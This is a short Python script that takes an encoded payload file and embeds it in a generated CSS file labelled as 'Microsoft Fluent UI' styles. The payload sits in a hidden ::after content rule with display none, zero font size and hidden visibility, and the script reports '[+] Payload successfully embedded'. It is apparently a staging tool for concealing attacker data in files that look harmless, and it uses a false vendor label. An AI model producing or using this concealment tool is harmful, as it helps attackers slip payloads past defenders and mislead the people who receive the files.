import sys

if len(sys.argv) != 3:
    print("Usage: python3 embed_in_css.py <input_encoded.txt> <output_css>")
    sys.exit(1)

input_path = sys.argv[1]
output_path = sys.argv[2]

with open(input_path, "r") as f:
    encoded = f.read().strip()

css = f"""
/* Microsoft Fluent UI – dynamic style injection */
body {{
  font-family: "Segoe UI", system-ui, sans-serif;
  background-color: #ffffff;
  margin: 0;
  padding: 0;
}}

.container {{
  max-width: 1080px;
  margin: auto;
  padding: 24px;
}}

.payload::after {{
  content: "{encoded}";
  display: none;
  font-size: 0;
  visibility: hidden;
}}
"""

with open(output_path, "w") as f:
    f.write(css)

print(f"[+] Payload successfully embedded into {output_path}")
